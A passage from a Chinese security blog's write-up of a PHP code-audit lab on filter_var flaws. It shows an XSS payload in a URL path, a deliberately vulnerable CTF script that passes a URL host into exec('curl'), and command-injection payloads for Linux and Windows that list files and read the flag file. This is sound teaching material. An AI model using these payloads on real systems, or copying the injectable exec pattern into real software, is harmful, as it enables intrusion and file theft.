+<p><strong>static::format</strong> &#x65B9;&#x6CD5;&#x5BF9; <strong>$uri</strong>  &#x8FDB;&#x884C;&#x4E86;&#x4E09;&#x6B21;&#x8FC7;&#x6EE4;&#xFF0C; &#x4F46;&#x662F;&#x90FD;&#x6CA1;&#x6709;&#x9488;&#x5BF9; XSS &#x653B;&#x51FB;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($uri, $server)</span> </span>{</span><br><span class="line">	<span class="comment">// Remove all characters except letters,</span></span><br><span class="line">	<span class="comment">// digits and $-_.+!*&apos;(),{}|\\^~[]`&lt;&gt;#%&quot;;/?:@&amp;=.</span></span><br><span class="line">	$uri = filter_var(rawurldecode($uri), FILTER_SANITIZE_URL);</span><br><span class="line">	<span class="comment">// &#x5BF9;&#x5DF2;&#x7F16;&#x7801;&#x7684; URL &#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x5E76;&#x9664;&#x53BB;&#x5B57;&#x6BCD;&#xFF0C;&#x6570;&#x5B57;&#x548C; $ -_&#x3002;+&#xFF01;*&apos;&#xFF08;&#xFF09;&#xFF0C;{} | \\ ^&#x301C;[]`&lt;&gt;&#xFF03;&#xFF05;&#x201C;; /&#xFF1F;&#xFF1A;@&#xFF06;= &#x4EE5;&#x5916;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// remove script path/name</span></span><br><span class="line">	<span class="comment">// &#x4ECE; $uri &#x4E2D;&#x5254;&#x9664;&#x9996;&#x90E8;&#x7684; $_SERVER[&apos;SCRIPT_NAME&apos;](&#x811A;&#x672C;&#x8DEF;&#x5F84;&#x4FE1;&#x606F;)</span></span><br><span class="line">	$uri = <span class="keyword">static</span>::remove_script_name($uri, $server);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remove the relative uri</span></span><br><span class="line">	$uri = <span class="keyword">static</span>::remove_relative_uri($uri);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//remove the relative uri</span></span><br><span class="line">	<span class="keyword">return</span> trim($uri, <span class="string">&apos;/&apos;</span>) ?: <span class="string">&apos;/&apos;</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x5C0F;&#x7ED3;"><a href="#&#x5C0F;&#x7ED3;" class="headerlink" title="&#x5C0F;&#x7ED3;"></a>&#x5C0F;&#x7ED3;</h2><p><strong>static::detect()</strong> &#x5C06;&#x4ECE; <code>$_SERVER[]</code> &#x6570;&#x7EC4;&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x8DEF;&#x5F84;&#x548C;&#x53C2;&#x6570;&#x4FE1;&#x606F;&#xFF0C;&#x9664;&#x53BB;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x548C;&#x53C2;&#x6570;&#x540E;&#x4EA4;&#x7531; <strong>static::format()</strong> &#x65B9;&#x6CD5;&#x5904;&#x7406;&#x3002;<strong>static::format()</strong> &#x5C06; <code>$uri</code> &#x89E3;&#x7801;&#xFF08;&#x4E0D;&#x80FD;&#x5C06; <code>+</code> &#x53F7;&#x89E3;&#x7801;&#x6210;&#x7A7A;&#x683C;&#xFF09;&#xFF0C;&#x518D;&#x6B21;&#x53BB;&#x9664;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;&#x968F;&#x540E;&#x5C06;&#x5254;&#x9664;&#x4E86; PHP &#x811A;&#x672C;&#x8DEF;&#x5F84;&#x4FE1;&#x606F;&#x548C;&#x76F8;&#x5BF9; URI &#x8DEF;&#x5F84;&#x7684; <code>$uri</code> &#x8FD4;&#x56DE;&#x7ED9; <code>current_url()</code> &#x51FD;&#x6570;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x9488;&#x5BF9; XSS &#x8FDB;&#x884C;&#x8FC7;&#x6EE4;</p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"><a href="#&#x6F0F;&#x6D1E;&#x5229;&#x7528;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"></a>&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h1><p>&#x4F8B;&#x5982;&#x6784;&#x9020;&#x5982;&#x4E0B; Payload&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//test.com/Day2/a/&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x7A0B;&#x5E8F;&#x4F1A;&#x8C03;&#x7528; 404 &#x6A21;&#x677F;&#x9875;&#x9762;&#xFF0C;&#x6700;&#x7EC8; <strong>current_url()</strong> &#x63A5;&#x53D7;&#x5230;&#x7684;&#x6570;&#x636E;&#x4E3A; <code>/a/&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/xss.png" alt="image-20191105182229289"></p>
+<h1 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h1><p>&#x9488;&#x5BF9; XSS &#x6F0F;&#x6D1E;&#xFF0C;&#x6211;&#x4EEC;&#x6700;&#x597D;&#x5C31;&#x662F;&#x8FC7;&#x6EE4;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x5C06;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FDB;&#x884C; HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x66FF;&#x6362;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x7531;&#x4E8E; URL &#x6807;&#x51C6;&#x7684;&#x7075;&#x6D3B;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7; filter_var &#x4E0E; parse_url &#x8FDB;&#x884C; SSRF</p>
+<h2 id="Day2-CTF"><a href="#Day2-CTF" class="headerlink" title="Day2 - CTF"></a>Day2 - CTF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">&apos;url&apos;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)){</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&apos;/sec-redclub.com$/&apos;</span>,$site_info[<span class="string">&apos;host&apos;</span>])){</span><br><span class="line">        exec(<span class="string">&apos;curl &quot;&apos;</span>.$site_info[<span class="string">&apos;host&apos;</span>].<span class="string">&apos;&quot;&apos;</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl {$site_info[&apos;host&apos;]} successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&apos;20&apos; cols=&apos;90&apos;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">&apos; &apos;</span>, $result);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">&quot;HRCTF{f1lt3r_var_1s_s0_c00l}&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>&#x8FD9;&#x4E00;&#x9898;&#x8003;&#x5BDF;&#x4E86;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF0C; <code>$url</code> &#x9700;&#x7B26;&#x5408; <code>filter_var($url, FILTER_VALIDATE_URL)</code> &#xFF0C;&#x4E14; <code>$site_info[&apos;host&apos;]</code> &#x5FC5;&#x987B;&#x4EE5; <code>sec-redclub.com</code> &#x7ED3;&#x5C3E;</p>
+<h3 id="Linux-&#x73AF;&#x5883;"><a href="#Linux-&#x73AF;&#x5883;" class="headerlink" title="Linux &#x73AF;&#x5883;"></a>Linux &#x73AF;&#x5883;</h3><p>&#x6784;&#x9020; Payload &#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x6587;&#x4EF6;</span></span><br><span class="line">?url=htt://<span class="string">&quot;|ls;&quot;</span>sec-redclub.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x67E5;&#x770B; f1agi3hEre.php &#x5185;&#x5BB9;</span></span><br><span class="line">?url=htt://<span class="string">&quot;|cat&lt;f1agi3hEre.php;&quot;</span>sec-redclub.com</span><br></pre></td></tr></table></figure>
+
+<p>&#x6267;&#x884C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/Linux.png" alt="image-20191105211621851"></p>
+<h3 id="Windows-&#x73AF;&#x5883;"><a href="#Windows-&#x73AF;&#x5883;" class="headerlink" title="Windows &#x73AF;&#x5883;"></a>Windows &#x73AF;&#x5883;</h3><p>&#x5B66;&#x4E60;&#x4E86; <a href="https://xz.aliyun.com/u/10916" target="_blank" rel="noopener"><strong>weigr</strong></a> &#x8868;&#x54E5;&#x7684;&#x65B9;&#x6CD5;</p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/type.png" alt="image-20191106103314413"></p>
+<p>Payload &#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x6587;&#x4EF6;</span></span><br><span class="line">?url=htt://<span class="string">&quot;|dir||sec-redclub.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># &#x67E5;&#x770B; f1agi3hEre.php &#x5185;&#x5BB9;</span></span><br><span class="line"><span class="string">?url=htt://&quot;</span>|<span class="built_in">type</span>=f1agi3hEre.php||sec-redclub.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/Windows.png" alt="image-20191106111158842"></p>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day2 - filter_var&#x51FD;&#x6570;&#x7F3A;&#x9677;</a> </p>
+<p><a href="https://medium.com/@fran_bl4kd43m0n/one-way-to-bypass-htmlentities-c96e69a6e12c" target="_blank" rel="noopener">One way to bypass htmlentities</a> </p>
+<p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space" target="_blank" rel="noopener">Bypass Without Space</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>c0r1</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.c0r1.com/2019/11/04/PHP-Audit-Labs-Day2-filter-var-函数缺陷/">http://www.c0r1.com/2019/11/04/PHP-Audit-Labs-Day2-filter-var-函数缺陷/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/代码审计/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/12/XXE-学习笔记/">XXE 学习笔记</a>
+            
+            
+            <a class="next" rel="next" href="/2019/11/01/Day1-CTF/">Day1-CTF</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
